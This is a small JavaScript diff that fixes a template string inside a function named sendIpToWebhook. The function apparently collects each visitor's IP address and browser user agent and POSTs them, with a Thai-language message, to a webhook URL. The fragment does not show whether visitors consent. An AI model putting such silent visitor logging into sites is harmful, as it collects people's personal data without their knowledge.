@@ -172,7 +172,7 @@ function sendIpToWebhook() {
       const ip = data.ip;
       const ua = navigator.userAgent;
 
-      const content = 📍 มีผู้ใช้ส่ง IP:\n🌐 IP: \${ip}\\n💻 User Agent: \${ua}\`;
+      const content = `📍 มีผู้ใช้ส่ง IP:\n🌐 IP: \`${ip}\`\n💻 User Agent: \`${ua}\``;
 
       return fetch(webhookUrl, {
         method: "POST",
